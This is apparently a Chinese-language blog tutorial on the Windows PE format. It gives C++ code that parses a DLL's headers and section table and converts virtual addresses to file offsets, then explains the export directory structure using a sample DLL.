-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\mydll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>关键代码</strong></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
-
-<p>由于之前的函数是VA转FOA，这边我们拿到的是RVA,因此想要正确利用，需要用到RVA + ImageBase得到VA</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014201121563.png" alt="image-20211014201121563"></p>
-<p>自此拿到FOA为:0x79B0</p>
-<h2 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>可以定位到导出表后下一步便是要了解导出表的结构，才能解读导出表的信息</p>
-<p>C语言中的结构体(Winnt.h可以找到)，本结构在C语言中长40字节，导出表范围:导出表首地址(FOA)+导出表长度-1 (减1是由于导出表首地址也占一个字节)</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014203245039.png" alt="image-20211014203245039"></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>结构体分析</strong></p>
-<table>
-<thead>
-<tr>
-<th>成员</th>
-<th>数据宽度</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Characteristics</td>
-<td>DWORD(4字节)</td>
-<td>标志，未用</td>
-</tr>
-<tr>
-<td>TimeDateStamp</td>
-<td>DWORD(4字节)</td>
-<td>时间戳</td>
-</tr>
-<tr>
-<td>MajorVersion</td>
-<td>WORD(2字节)</td>
-<td>未用</td>
-</tr>
-<tr>
-<td>MinorVersion</td>
-<td>WORD(2字节)</td>
-<td>未用</td>
-</tr>
-<tr>
-<td>Name</td>
-<td>DWORD(4字节)</td>
-<td>指向该导出表的文件名字符串</td>
-</tr>
-<tr>
-<td>Base</td>
-<td>DWORD(4字节)</td>
-<td>导出函数起始序号</td>
-</tr>
-<tr>
-<td>NumberOfFunctions</td>
-<td>DWORD(4字节)</td>
-<td>所有导出函数的个数</td>
-</tr>
-<tr>
-<td>NumberOfNames</td>
-<td>DWORD(4字节)</td>
-<td>以函数名字导出的函数个数</td>
-</tr>
-<tr>
-<td>AddressOfFunctions</td>
-<td>DWORD(4字节)</td>
-<td>导出函数地址表RVA</td>
-</tr>
-<tr>
-<td>AddressOfNames</td>
-<td>DWORD(4字节)</td>
-<td>导出函数名称表RVA</td>
-</tr>
-<tr>
-<td>AddressOfNameOrdinals</td>
-<td>DWORD(4字节)</td>
-<td>导出函数序号表RVA</td>
-</tr>
-</tbody></table>
-<p>解释几个比较重要的字段</p>
-<h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4><p>该字段指示的地址指向了一个以”\0”结尾的字符串，字符串记录了导出表所在文件的最初文件名，因此就算后期重命名此PE文件，也可在name处找到最初文件名</p>
-<h4 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h4><p>该字段指出了导出函数序号的起始值。dll中第一个导出函数的序号并非从0开始，导出函数的编号等于从AddressOfFunction开始的序号加上这个值。大概意思是这样</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014205036689.png" alt="image-20211014205036689"></p>
-<p>如图所示，Func1的函数编号为nBase + 0 = 200h， Func2的函数编号为 nbase + 1 = 201h</p>
-<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>该字段定义了文件中导出函数的总个数</p>
-<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果这个值是0，则表示所有的函数都没有定义名字。NumbersOfNames一定小于等于NumbersOfFuctions</p>
-<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>该值为一个指针。该指针指向的位置是一连串的DWORD值，这些值均指向了对应的定义了函数名的函数的字符串地址。这一连串的DWORD值的个数为NumberOfNames</p>
-<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>该指针指向了全部导出函数的入口地址的起始。从入口地址开始为DWORD数组，数组的个数由NumbersOfFuctions决定</p>
-<p>导出函数的每一个地址<strong>按函数的编号顺序</strong>依次往后排开。在内存中，可以通过<strong>函数编号</strong>来定位某个函数的地址</p>
-<h4 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>该值也是一个指针，与AddressOfNames是<strong>一一对应</strong>关系</p>
-<p>不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfNameOrdinals则指向了该函数在AddressOfFunctions中的<strong>索引值</strong></p>
-<hr>
-<p>注意：<strong>索引值数据类型为WORD，而非DWORD</strong>。该值与函数编号是两个不同的概念，两者的关系为：</p>
-<p>索引值 = 编号 - Base</p>
-<h3 id="根据结构分析导出表"><a href="#根据结构分析导出表" class="headerlink" title="根据结构分析导出表"></a>根据结构分析导出表</h3><p>根据之前拿到的导出表FOA + 40 - 1 ，拿到导出表范围，自0x79B0 至0x79D7</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015093614192.png" alt="image-20211015093614192"></p>
-<table>
-<thead>
-<tr>
-<th align="center">成员</th>
-<th>值</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Characteristics</td>
-<td>0x00000000</td>
-<td>标志，未用</td>
-</tr>
-<tr>
-<td align="center">TimeDateStamp</td>
-<td>0xFFFFFFFF</td>
-<td>时间戳</td>
-</tr>
-<tr>
-<td align="center">MajorVersion</td>
-<td>0x0000</td>
-<td>未用</td>
-</tr>
-<tr>
-<td align="center">MinorVersion</td>
-<td>0x0000</td>
-<td>未用</td>
-</tr>
-<tr>
-<td align="center">Name</td>
-<td>0x0001900A</td>
-<td>指向该导出表文件名字符串</td>
-</tr>
-<tr>
-<td align="center">Base</td>
-<td>0x0000000A</td>
-<td>导出函数的起始序号</td>
-</tr>
-<tr>
-<td align="center">NumberOfFunctions</td>
-<td>0x00000008</td>
-<td>所有导出函数的个数</td>
-</tr>
-<tr>
-<td align="center">NumberOfNames</td>
-<td>0x00000003</td>
-<td>以函数名字导出的函数个数</td>
-</tr>
-<tr>
-<td align="center">AddressOfFunctions</td>
-<td>0x00018FD8</td>
-<td>导出函数地址表RVA</td>
-</tr>
-<tr>
-<td align="center">AddressOfNames</td>
-<td>0x00018FF8</td>
-<td>导出函数名称表RVA</td>
-</tr>
-<tr>
-<td align="center">AddressOfNameOrdinals</td>
-<td>0x00019004</td>
-<td>导出函数序号表RVA</td>
-</tr>
-</tbody></table>
-<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>存储的值为指针，该指针为RVA(0x1900A)，同样需要转换成FOA</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1900A</span>,dos,nt,sectionArr); <span class="comment">//0x1900A 为name的rva</span></span><br></pre></td></tr></table></figure>
-
-<p>运行可得</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110233872.png" alt="image-20211015110233872"></p>
-<p>利用16进制编辑器得到0x7A0A,拿到Name,PE文件的文件名字符串，以00结尾，MyDll.dll</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110551475.png" alt="image-20211015110551475"></p>
-<h4 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h4><p>导出函数起始序号的RVA 为 0xA , 对应十进制10</p>
-<p>回顾之前导出函数的定义</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看出，此处的base=最小的序号=min{12,15,17,10}=10</p>
-<h4 id="NumberOfFunctions-1"><a href="#NumberOfFunctions-1" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数为8</p>
-<p>为什么前面声明的导出函数只有4个，但这里显示的却会有八个？</p>
-<p>此处的NumberOfFunctions = 最大的序号减去最小的序号 +1 =17-10+1=8</p>
-<h4 id="NumberOfNames-1"><a href="#NumberOfNames-1" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>以函数名字导出的函数个数为3，和定义声明中有名称的导出函数数量一致</p>
-<h4 id="AddressOfFunctions-1"><a href="#AddressOfFunctions-1" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>存储的值为指针，该指针为RVA(0x18FD8)，同样需要转换为FOA</p>
